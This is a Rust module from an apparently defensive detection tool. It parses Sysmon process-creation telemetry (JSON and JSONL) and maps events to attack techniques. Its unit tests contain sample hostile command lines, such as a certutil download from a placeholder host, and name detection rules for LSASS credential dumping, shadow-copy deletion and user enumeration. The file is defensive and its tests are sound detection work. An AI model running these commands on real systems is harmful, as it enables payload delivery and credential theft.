//! Ingest recorded host telemetry — the events a sensor actually logged — and
//! reduce each to the [`Command`]s the analyzer already understands. This is the
//! complement to opseclint's predictive mode: instead of *predicting* the
//! telemetry a command would emit, it takes real telemetry and maps it back to
//! techniques, detectability, and coverage, answering "given what the sensor
//! recorded, which techniques does this represent?"
//!
//! The first supported source is Windows **Sysmon Event ID 1** (Process Create),
//! exported as JSON. Its `Image` / `CommandLine` / `OriginalFileName` fields are
//! exactly the event model [`crate::sigma_eval`] synthesizes from a command
//! line, so a real process-creation event reduces cleanly to a `Command` and
//! drives the existing matcher unchanged — no new matching layer.
//!
//! This is an *observation* front-end: it describes what a defender's sensor
//! saw. Like the rest of opseclint it encodes detectability only, never evasion.
//!
//! Only process-creation records are ingested. A file that mixes in other event
//! classes (network / file / registry) has those records **skipped and
//! counted** — surfaced to the user, never silently dropped.

use std::collections::HashMap;

use serde_json::Value;

use crate::parser::{self, Command};

/// A telemetry format opseclint can ingest. Sysmon EID 1 JSON is the first
/// end-to-end cut; auditd and macOS/ESF land as further formats behind the same
/// `--telemetry` input path.
#[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum)]
pub enum Format {
    /// Windows Sysmon Event ID 1 (Process Create), JSON — a top-level array of
    /// event objects, or one JSON object per line (JSONL).
    Sysmon,
}

/// One ingested telemetry record reduced to the analyzer's unit shape: the
/// commands resolved from the event, the raw command line the sensor recorded,
/// and the full field map of the event (canonically named). `record` is the
/// 1-based position of the source record (used as the finding's line number, so
/// a finding points back at the record it came from). `event` carries the fields
/// a command line can't supply — `ParentImage`, `User`, `IntegrityLevel`, … — so
/// Sigma evaluation can resolve rules keyed on them against the real event.
#[derive(Debug, Clone)]
pub struct Observation {
    pub record: usize,
    pub commands: Vec<Command>,
    pub raw: String,
    pub event: HashMap<String, String>,
}

/// The result of ingesting a telemetry file: the process-creation observations
/// to analyze, and how many records were skipped because they are not
/// process-creation events.
#[derive(Debug, Clone)]
pub struct Ingest {
    pub observations: Vec<Observation>,
    pub skipped: usize,
}

/// Parse recorded telemetry `text` in the given `format` into observations.
pub fn parse(text: &str, format: Format) -> Result<Ingest, String> {
    match format {
        Format::Sysmon => parse_sysmon(text),
    }
}

fn parse_sysmon(text: &str) -> Result<Ingest, String> {
    let events = read_events(text)?;
    let mut observations = Vec::new();
    let mut skipped = 0;
    for (i, ev) in events.iter().enumerate() {
        let fields = flatten_fields(ev);
        match reduce_process_create(&fields) {
            Some((commands, raw)) => observations.push(Observation {
                record: i + 1,
                commands,
                raw,
                event: fields,
            }),
            None => skipped += 1,
        }
    }
    Ok(Ingest {
        observations,
        skipped,
    })
}

/// Canonical Sysmon Event ID 1 field names. Ingested records arrive with varied
/// casing and nesting; canonicalizing on the way in lets both the reduction and
/// the Sigma evaluator address a field by the standard name a rule references
/// (e.g. a `ParentImage|endswith` selection). Unrecognized keys are kept as-is.
const SYSMON_FIELDS: &[&str] = &[
    "EventID",
    "Image",
    "CommandLine",
    "OriginalFileName",
    "CurrentDirectory",
    "User",
    "IntegrityLevel",
    "Hashes",
    "Company",
    "Description",
    "Product",
    "FileVersion",
    "ParentImage",
    "ParentCommandLine",
    "ParentUser",
    "ParentProcessId",
    "ProcessId",
    "LogonId",
    "TerminalSessionId",
];

/// Map an incoming field key to its canonical Sysmon name (case-insensitively),
/// normalizing the Elastic `winlog` `event_id` alias to `EventID`.
fn canonical_field(key: &str) -> String {
    if key.eq_ignore_ascii_case("event_id") {
        return "EventID".to_string();
    }
    SYSMON_FIELDS
        .iter()
        .find(|f| key.eq_ignore_ascii_case(f))
        .map(|f| f.to_string())
        .unwrap_or_else(|| key.to_string())
}

/// Read a telemetry document into a flat list of event values, accepting the
/// three shapes real exporters produce: a top-level JSON array of events, a
/// single JSON object, or JSONL (one JSON object per line).
fn read_events(text: &str) -> Result<Vec<Value>, String> {
    let trimmed = text.trim_start();
    if trimmed.starts_with('[') {
        let v: Value =
            serde_json::from_str(text).map_err(|e| format!("invalid JSON array: {e}"))?;
        return match v {
            Value::Array(items) => Ok(items),
            _ => Err("expected a JSON array of events".to_string()),
        };
    }
    // A single JSON object spanning the whole input (possibly pretty-printed).
    if trimmed.starts_with('{')
        && let Ok(v) = serde_json::from_str::<Value>(text)
    {
        return Ok(vec![v]);
    }
    // JSONL: one JSON value per non-empty line.
    let mut out = Vec::new();
    for (n, line) in text.lines().enumerate() {
        let l = line.trim();
        if l.is_empty() {
            continue;
        }
        let v: Value =
            serde_json::from_str(l).map_err(|e| format!("invalid JSON on line {}: {e}", n + 1))?;
        out.push(v);
    }
    if out.is_empty() {
        return Err("no telemetry records found".to_string());
    }
    Ok(out)
}

/// Flatten an event object into a map of scalar fields keyed by canonical Sysmon
/// field name, descending through the container objects different exporters wrap
/// event data in (`EventData`, Elastic's `winlog.event_data`, an outer `Event`,
/// …) and the EVTX→JSON `{ "@Name": "Image", "#text": "…" }` array shape.
/// Top-level scalars win over nested ones, which is correct: flat Sysmon JSON
/// carries the fields at the top level, and the nested shapes carry them only
/// when the top level does not. Canonical names let the reduction and the Sigma
/// evaluator address a field by the standard name a rule references.
fn flatten_fields(ev: &Value) -> HashMap<String, String> {
    let mut out = HashMap::new();
    collect_scalars(ev, &mut out, 0);
    out
}

fn collect_scalars(v: &Value, out: &mut HashMap<String, String>, depth: usize) {
    // Guard against pathological nesting; real telemetry wraps two, maybe three
    // levels deep.
    if depth > 4 {
        return;
    }
    let Some(map) = v.as_object() else { return };

    // Two passes so precedence is by depth, not by key order: insert every
    // scalar at this level first, then descend. With `or_insert` (first write
    // wins), a shallower field always wins over an equivalent deeper one —
    // regardless of the order the serializer yields keys in. That is what makes
    // a flat top-level field win over the same field nested in `EventData`.
    for (k, val) in map {
        if let Some(s) = value_scalar(val) {
            out.entry(canonical_field(k)).or_insert(s);
        }
    }
    for val in map.values() {
        match val {
            Value::Object(_) => collect_scalars(val, out, depth + 1),
            Value::Array(items) => {
                for item in items {
                    // The EVTX→JSON name/value shape: each entry names one field.
                    let obj = item.as_object();
                    let name = obj
                        .and_then(|o| o.get("@Name").or_else(|| o.get("Name")))
                        .and_then(Value::as_str);
                    let text = obj.and_then(|o| o.get("#text").or_else(|| o.get("text")));
                    match (name, text) {
                        (Some(name), Some(text)) => {
                            if let Some(s) = value_scalar(text) {
                                out.entry(canonical_field(name)).or_insert(s);
                            }
                        }
                        _ => collect_scalars(item, out, depth + 1),
                    }
                }
            }
            _ => {}
        }
    }
}

fn value_scalar(v: &Value) -> Option<String> {
    match v {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

/// Reduce a flattened event to `(commands, raw)` if it is a process-creation
/// record, else `None` (so the caller can count it as skipped).
///
/// A record is process-creation when its event id is `1`, or — when no event id
/// is present (some Sysmon-only EID 1 exports omit it) — when it carries a
/// command line. Requiring the command line in the id-less case is what keeps a
/// network (EID 3) or file (EID 11) record, which carries an `Image` but no
/// `CommandLine`, from being misread as a process launch.
fn reduce_process_create(fields: &HashMap<String, String>) -> Option<(Vec<Command>, String)> {
    // Fields are canonically named by `flatten_fields`, so the Sysmon standard
    // names address them directly.
    let event_id = fields.get("EventID");
    let command_line = fields.get("CommandLine").map(String::as_str).unwrap_or("");
    let is_process_create = match event_id {
        Some(id) => id.trim() == "1",
        None => !command_line.trim().is_empty(),
    };
    if !is_process_create {
        return None;
    }

    let image = fields.get("Image").map(String::as_str).unwrap_or("");
    // Prefer the recorded command line as the raw text; fall back to the image
    // path when a Process Create event carries no command line.
    let raw = if command_line.trim().is_empty() {
        image.to_string()
    } else {
        command_line.to_string()
    };
    if raw.trim().is_empty() {
        return None;
    }

    // Reuse the shell parser to tokenize the recorded command line (wrapper
    // stripping, quote handling, and compound-line splitting all come for free),
    // then trust `Image` for the primary program's basename — it is the
    // authoritative executable path, matched with the same normalization the KB
    // keys on.
    let mut commands = parser::parse_line(&raw);
    if !image.trim().is_empty() {
        let program = parser::basename(image);
        match commands.first_mut() {
            Some(first) => first.program = program,
            None => commands.push(Command {
                program,
                args: Vec::new(),
                raw: raw.clone(),
            }),
        }
    }
    Some((commands, raw))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyzer;
    use crate::kb;
    use crate::model::KnowledgeBase;
    use std::path::PathBuf;

    fn fixture(name: &str) -> String {
        let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/telemetry")
            .join(name);
        std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("read {}: {e}", path.display()))
    }

    fn win_kb() -> KnowledgeBase {
        kb::load(kb::Platform::WindowsSysmon).expect("windows KB must parse")
    }

    fn ids(report: &crate::model::Report) -> Vec<String> {
        report.findings.iter().map(|f| f.rule_id.clone()).collect()
    }

    #[test]
    fn ingests_sysmon_array_and_skips_non_process_events() {
        let ingest = parse(&fixture("sysmon-eid1.json"), Format::Sysmon).expect("parses");
        // Three EID 1 process events; the lone EID 3 network record is skipped.
        assert_eq!(ingest.observations.len(), 3);
        assert_eq!(ingest.skipped, 1);
        // Record numbers reflect source position (the skipped record is #4).
        assert_eq!(
            ingest
                .observations
                .iter()
                .map(|o| o.record)
                .collect::<Vec<_>>(),
            vec![1, 2, 3]
        );
    }

    #[test]
    fn analyzes_ingested_sysmon_events_via_the_existing_matcher() {
        let ingest = parse(&fixture("sysmon-eid1.json"), Format::Sysmon).expect("parses");
        let report = analyzer::analyze_telemetry(&ingest.observations, &win_kb());
        let ids = ids(&report);
        // The malicious process-creation events map to their KB entries…
        assert!(ids.contains(&"certutil-download".to_string()));
        assert!(ids.contains(&"lsass-comsvcs".to_string()));
        // …and the finding points back at the record it came from.
        let certutil = report
            .findings
            .iter()
            .find(|f| f.rule_id == "certutil-download")
            .unwrap();
        assert_eq!(certutil.line, 1);
    }

    #[test]
    fn image_is_authoritative_for_the_program_basename() {
        // A single flat event: the program comes from `Image` (path-stripped,
        // `.exe`-normalized), matching how the KB resolves a program.
        let ev = r#"{"EventID":1,"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -urlcache -f http://x/a a"}"#;
        let ingest = parse(ev, Format::Sysmon).expect("parses");
        assert_eq!(ingest.observations.len(), 1);
        assert_eq!(ingest.observations[0].commands[0].program, "certutil");
    }

    #[test]
    fn ingests_jsonl_with_nested_event_data() {
        // JSONL, exercising the `EventData` and Elastic `winlog.event_data`
        // nesting shapes.
        let ingest = parse(&fixture("sysmon-eid1.jsonl"), Format::Sysmon).expect("parses");
        assert_eq!(ingest.observations.len(), 2);
        assert_eq!(ingest.skipped, 0);
        let report = analyzer::analyze_telemetry(&ingest.observations, &win_kb());
        let ids = ids(&report);
        assert!(ids.contains(&"vssadmin-delete".to_string()));
        assert!(ids.contains(&"net-user".to_string()));
    }

    #[test]
    fn network_event_without_a_command_line_is_not_a_process_create() {
        // Sysmon EID 3 (network connection) carries an Image but no CommandLine;
        // even with the event id stripped it must not be read as a process.
        let mut fields = HashMap::new();
        fields.insert(
            "Image".to_string(),
            "C:\\Windows\\System32\\svchost.exe".to_string(),
        );
        fields.insert("DestinationIp".to_string(), "192.0.2.1".to_string());
        assert!(reduce_process_create(&fields).is_none());
    }

    #[test]
    fn observed_mode_agrees_with_predictive_mode() {
        // The same command, seen as recorded telemetry or predicted from text,
        // must resolve to the same findings — the two modes share one matcher.
        let cmdline = "certutil.exe -urlcache -f http://x/a.exe a.exe";
        let ev = format!(
            r#"{{"EventID":1,"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"{cmdline}"}}"#
        );
        let ingest = parse(&ev, Format::Sysmon).expect("parses");
        let observed = ids(&analyzer::analyze_telemetry(
            &ingest.observations,
            &win_kb(),
        ));
        let predicted = ids(&analyzer::analyze(cmdline, &win_kb()));
        let set = |v: Vec<String>| v.into_iter().collect::<std::collections::BTreeSet<_>>();
        assert_eq!(set(observed), set(predicted));
    }

    #[test]
    fn top_level_field_wins_over_a_nested_duplicate() {
        // When a record carries the same field both flat and nested, the
        // top-level value wins — deterministically, regardless of key order.
        let ev = r#"{
            "EventData": { "Image": "C:\\nested\\reg.exe", "CommandLine": "reg query HKLM" },
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "EventID": 1
        }"#;
        let value: serde_json::Value = serde_json::from_str(ev).unwrap();
        let fields = flatten_fields(&value);
        assert_eq!(
            fields.get("Image").map(String::as_str),
            Some("C:\\Windows\\System32\\certutil.exe")
        );
        // The nested-only field is still collected.
        assert_eq!(
            fields.get("CommandLine").map(String::as_str),
            Some("reg query HKLM")
        );
    }

    #[test]
    fn observation_carries_canonical_event_fields() {
        // The fields a command line can't supply are canonically named and kept
        // on the observation, so Sigma evaluation can consult them. Casing and
        // the Elastic `winlog` nesting are both normalized.
        let ev = r#"{"winlog":{"event_id":1,"event_data":{
            "Image":"C:\\Windows\\System32\\certutil.exe",
            "CommandLine":"certutil -urlcache -f http://x/a a",
            "parentimage":"C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
            "IntegrityLevel":"Medium"
        }}}"#;
        let ingest = parse(ev, Format::Sysmon).expect("parses");
        let event = &ingest.observations[0].event;
        assert_eq!(event.get("EventID").map(String::as_str), Some("1"));
        assert_eq!(
            event.get("ParentImage").map(String::as_str),
            Some("C:\\Program Files\\Microsoft Office\\WINWORD.EXE")
        );
        assert_eq!(
            event.get("IntegrityLevel").map(String::as_str),
            Some("Medium")
        );
    }

    #[test]
    fn invalid_json_is_a_clear_error() {
        assert!(parse("not json at all", Format::Sysmon).is_err());
    }
}
